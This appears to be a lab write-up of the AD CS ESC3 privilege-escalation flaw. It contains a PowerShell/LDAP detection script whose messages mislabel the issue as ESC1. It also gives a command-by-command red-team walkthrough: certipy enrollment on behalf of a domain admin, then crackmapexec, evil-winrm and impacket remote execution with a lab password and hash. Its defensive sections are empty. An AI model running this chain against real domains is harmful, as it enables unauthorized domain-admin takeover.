# Table of Contents

1. [ESC3 Vulnerability](#esc3-vulnerability)
2. [Misconfigurations](#misconfigurations) </br>
   2.1. [Misconfiguration Condition](#misconfigurations-condition)</br>
   2.2. [Manual Detection with Powershell and LDAP](#manual-detection-with-powershell-and-ldap)
5. [Red Team Activity](#red-team-activity)
6. [Blue Team Activity](#blue-team-activity)
7. [Mitigations and Best Practices](#mitigations-and-best-practices)

## ESC3 Vulnerability
Active Directory Certificate Services (AD CS) ESC3 is a specific vulnerability related to certificate enrollment in AD CS, which allows an attacker to escalate privileges by impersonating another user. ESC3 vulnerable template allow requester(attacker) to request certificate <b>on behalf of</b> other users.
## Misconfigurations
Unlike ESC1, the requester doesn't have to have the ability to specify subjectAltName (SAN) in the CSR. In other words, msPKI-Certificate-Name doesn't have to be set to flag "CT_FLAG_ENROLEE_SUPPLIES_SUBJECT".
### Misconfigurations Condition

```
IF 
(
    Manager approval is disabled                              // The msPKI-Enrollment-Flag must NOT have the 0x2 bit set

    AND 
    (
        Number of authorized signatures must be 0             // The msPKI-RA-Signature must be 0
        OR 
        msPKI-RA-Signature attribute is NOT present           // The msPKI-RA-Signature attribute must NOT be set (i.e., it doesn't exist)
    )

    AND 
    (
        The template has Certificate Request Agent EKU        // pkiextendedkeyusage = 1.3.6.1.4.1.311.20.2.1
        OR
        The template has Any Purpose EKU                      // pkiextendedkeyusage = 2.5.29.37.0
        OR
        The template has no EKU
    )

    AND
    (
        Authenticated Users can enroll    // IdentityReference is Authenticated Users, ActiveDirectoryRights is ExtendedRight
        OR
        Domain Users can enroll           // IdentityReference is Domain Users, ActiveDirectoryRights is ExtendedRight
        OR
        Everyone can enroll               // IdentityReference is Everyone, ActiveDirectoryRights is ExtendedRight
    ) 
    
)

```

### Manual Detection with Powershell and LDAP

```powershell
$domain = "DC=hogwarts,DC=local"
$Filter1 = '(objectclass=pkicertificatetemplate)' #Ensure that object is certificate
$Filter2 = '(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))' #Ensure that manager approval is disabled

$Filter3_1 = '(msPKI-RA-Signature=0)' # Ensure that 0 signatures required for a cert enrollment.
$Filter3_2 = '(!(msPKI-RA-Signature=*))' #Ensure that this attribute not set (i.e. it does not exist.)
$Filter3 = "(|"+$Filter3_1+$Filter3_2+")"


$Filter4 = "(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))"
# "(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1)"   # Certificate Request Agent EKU
# "(pkiextendedkeyusage = 2.5.29.37.0)"            # Any Purpose
# "(!(pkiextendedkeyusage=*))"                     # If pkiextendedkeyusage is not set. 

$Filter_LAST = "(&"+$Filter1+$Filter2+$Filter3+$Filter4+ ")"

$possible_certs = Get-ADObject -LDAPFilter $Filter_Last -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$($domain)" -Properties nTSecurityDescriptor | Where-Object { $_.Name -notin @("CA", "SubCA", "OfflineRouter") }
$cert_count = ($possible_certs | Measure-Object).Count

if($cert_count -ne 0)
{
    
    foreach ($cert in $possible_certs) 
    {
        $acl = $cert.nTSecurityDescriptor
        foreach($access in $acl.Access)
        {
            if(($access.IdentityReference -like "*Authenticated Users*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*'))
                {
                    echo "$($cert.Name) Authenticated Users with ExtendedRight and it is vulnerable to ESC1."
                }
            elseif((($access.IdentityReference -like "*Domain Users*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*')))
                {
                    echo "$($cert.Name) Domain Users with ExtendedRight and it is vulnerable to ESC1.."
                }
            elseif((($access.IdentityReference -like "*Everyone*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*')))
                {
                    echo " $($cert.Name) Everyone with ExtendedRight and it is vulnerable to ESC1."
                }

        }
    }
}
else
{
    echo "There is no certificate which is vulnerable to ESC1."
}
```

## Red Team Activity
HOGWARTS\harry.potter is a user with lowest privilege. It is a just a member of Domain Users. <br>
HOGWARTS\severus.snape is a domain admin user. <br>
### Step1-Find vulnerable Certificates Based on the Vulnerable Certificate Template ESC3.
```console
# certipy-ad find -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip "192.168.0.111"  -enabled -vulnerable -debug
```
<b>-enabled</b>    : Ignore disabled templates. <br>
<b>-vulnerable</b> : Show certificate templates that are vulnerable to known attacks or misconfigurations. <br>
<b>-debug</b>      : Provide more detailed information about the command's execution process. <br>

<img src="https://github.com/user-attachments/assets/2c156fbd-97f0-4c4e-a03a-9b8a809af252">

### Step2-Request a Certificate for a Current User

```console
# certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'ESC3_Template' -target CERT01.hogwarts.local
```
<b>-ca</b>         : Specifies CA.<br>
<b>-template</b>   : Specifies template name. <br>
<b>-target</b>     : DNS name of the CA. <br>

<img src="https://github.com/user-attachments/assets/8c90d57e-2b54-473d-8ff3-608de90dafd5">

### Step3-Request a Certificate on Behalf of Domain Admin User

```console
# certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'User' -target CERT01.hogwarts.local -pfx harry.potter.pfx -on-behalf-of 'HOGWARTS\severus.snape' -debug
```
<b>-on-behalf-of</b>        : Indicates on whose behalf the certificate is requested (Format: <b>HOGWARTS\severus.snape</b> or <b>severus.snape@hogwarts[.]local</b>)<br>
<b>-pfx</b>   : Specifies  Certificate Request Agent certificate  <br>
<b>-template</b>   : Value is <b>User</b> because we are using User's Certificate Request Agent pfx file.  <br>

<img src="https://github.com/user-attachments/assets/d380b4c1-600a-4419-89a9-dabbf03ebcb6">

### Step4-Use the New Certificate to Authenticate as Domain Admin User

```console
# certipy-ad auth -pfx severus.snape.pfx -dc-ip 192.168.0.111
```
<img src="https://github.com/user-attachments/assets/7c89e70d-01cb-4678-8dc7-3a2b3ae418ab">

### Step5-Further Activities

```console
# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1 -x whoami
# evil-winrm -i 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
```
If NTLM authentication is disabled 

```console
export KRB5CCNAME=severus.snape.ccache;impacket-psexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k hogwarts.local/severus.snape@DC01.hogwarts.local -debug
export KRB5CCNAME=severus.snape.ccache;impacket-wmiexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k hogwarts.local/severus.snape@DC01.hogwarts.local -debug
export KRB5CCNAME=severus.snape.ccache;impacket-psexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k @DC01.hogwarts.local -debug
export KRB5CCNAME=severus.snape.ccache;impacket-wmiexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k @DC01.hogwarts.local -debug
```
> [!NOTE]  
> Be careful when using impacket-psexec. Because this command creates a random 8-character exe file,which gives the system shell by token impersonating, in the ADMIN$ share. This exe file is considered malicious by AVs and EDRs.


## Blue Team Activity

## Mitigations and Best Practices
